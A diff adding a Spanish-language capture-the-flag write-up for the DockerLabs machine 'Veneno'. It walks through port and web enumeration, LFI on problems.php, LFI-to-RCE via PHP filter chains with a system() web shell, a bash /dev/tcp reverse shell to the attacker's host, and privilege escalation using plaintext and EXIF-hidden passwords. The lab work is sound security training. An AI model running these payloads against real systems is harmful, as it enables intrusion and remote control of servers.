@@ -1,0 +1,236 @@
+---
+title: Veneno
+description: Resolución completa de la máquina virtual *Veneno* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Veneno**, desarrollada por *firstatack* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con un parámetro `backdoor` vulnerable a **Local File Inclusion (LFI)**. Mediante fuzzing, se descubre el parámetro y se convierte el LFI en **RCE** utilizando una cadena de filtros de PHP, obteniendo una reverse shell como `www-data`.
+Una vez dentro, se encuentra una pista sobre una contraseña antigua, y mediante la búsqueda de archivos con `-mtime` se obtiene la contraseña del usuario `carlos`. Finalmente, se descubre una imagen oculta en el home de `carlos` que contiene la contraseña de `root` en sus metadatos EXIF, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Veneno',
+    Autor: 'firstatack',
+    Dificultad: 'Media',
+    Fecha: '30/06/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Veneno.zip
+sudo bash auto_deploy.sh Veneno.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Veneno/{content,exploits,nmap,scripts}
+cd Veneno
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1763885606/Ports_kbxgiv.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1763885604/Gobuster_ior1hf.png)
+
+**Rutas relevantes:**
+- `/uploads` — Directorio accesible.
+- `/problems.php` — Redirige constantemente al index.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Descubrimiento del parámetro
+
+Se fuzzea el parámetro oculto:
+
+```bash
+ffuf -u "http://172.17.0.2/problems.php?FUZZ=id" \
+  -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" \
+  -fs 10671
+```
+
+![FFUF](https://res.cloudinary.com/dewqswzke/image/upload/v1763885603/FFUF_nj11vk.png)
+
+Parámetro: `backdoor`.
+
+### 2.2 LFI
+
+```bash
+curl http://172.17.0.2/problems.php?backdoor=/etc/passwd
+```
+
+![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1763885604/Passwd_g9zjes.png)
+
+Usuario identificado: `carlos`.
+
+### 2.3 LFI → RCE con PHP filters
+
+Se utiliza `php_filter_chain_generator.py`:
+
+```bash
+php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
+```
+
+### 2.4 Reverse shell
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se ejecuta el payload:
+
+```bash
+curl 'http://172.17.0.2/problems.php?backdoor=php://filter<RECORTADO>php://temp&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F443%200%3E%261%27' --output -
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1763885606/Reverse_ovofyo.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → carlos
+
+Se encuentra una pista sobre una contraseña antigua:
+
+![Antiguo y fuerte](https://res.cloudinary.com/dewqswzke/image/upload/v1763885603/AntiguoyFuerte_t6begf.png)
+
+Se buscan archivos antiguos:
+
+```bash
+find / -type f -mtime +8700 2>/dev/null
+```
+
+![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1763885604/Find_lfaju0.png)
+
+Se encuentra `inhackeable_pass.txt` con la contraseña de `carlos`:
+
+```bash
+su carlos
+```
+
+![Carlos](https://res.cloudinary.com/dewqswzke/image/upload/v1763885603/Carlos_fckzme.png)
+
+### 3.2 De carlos → root
+
+Se encuentra una imagen oculta:
+
+```bash
+find . -type f 2>/dev/null
+```
+
+![Find2](https://res.cloudinary.com/dewqswzke/image/upload/v1763885603/Find2_xey2ir.png)
+
+Se descarga y se analiza con `exiftool`:
+
+```bash
+exiftool .toor.jpg
+```
+
+![ExifTool](https://res.cloudinary.com/dewqswzke/image/upload/v1763885603/ExifTool_cmoe33.png)
+
+En `Image Quality` aparece: `pingui1730`
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763885606/Root_togyak.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "LFI sin validación en problems.php",
+      severity: "Crítica",
+      impact: "Lectura de archivos del sistema"
+    },
+    {
+      vulnerability: "LFI → RCE mediante PHP filters",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Contraseña en texto plano en archivo antiguo",
+      severity: "Alta",
+      impact: "Movimiento lateral a carlos"
+    },
+    {
+      vulnerability: "Contraseña de root en metadatos EXIF de imagen",
+      severity: "Crítica",
+      impact: "Escalada directa de privilegios a root"
+    }
+  ]}
+/>
